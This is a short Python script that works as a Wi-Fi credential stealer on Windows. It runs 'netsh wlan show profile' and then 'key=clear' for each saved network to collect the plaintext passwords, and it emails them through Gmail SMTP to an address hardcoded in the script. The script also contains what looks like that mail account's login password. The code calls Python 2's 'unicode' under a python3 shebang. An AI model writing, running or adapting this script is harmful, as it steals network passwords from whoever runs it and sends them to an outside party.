#!/usr/bin/env python3
import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
network = unicode(subprocess.check_output(command, shell=True), "utf-8")
network_names_list = re.findall(r'(?:Profile\s*:\s)(.*)', network)
result= ""

for network_name in network_names_list:
    command = "netsh wlan show profile \"" + network_name + "\" key=clear"
    current_result = unicode(subprocess.check_output(command, shell=True),'utf-8')
    result = result + current_result

send_mail("muhammed.humam.hossain.f9@gmail.com","HEistleblower 09", result)
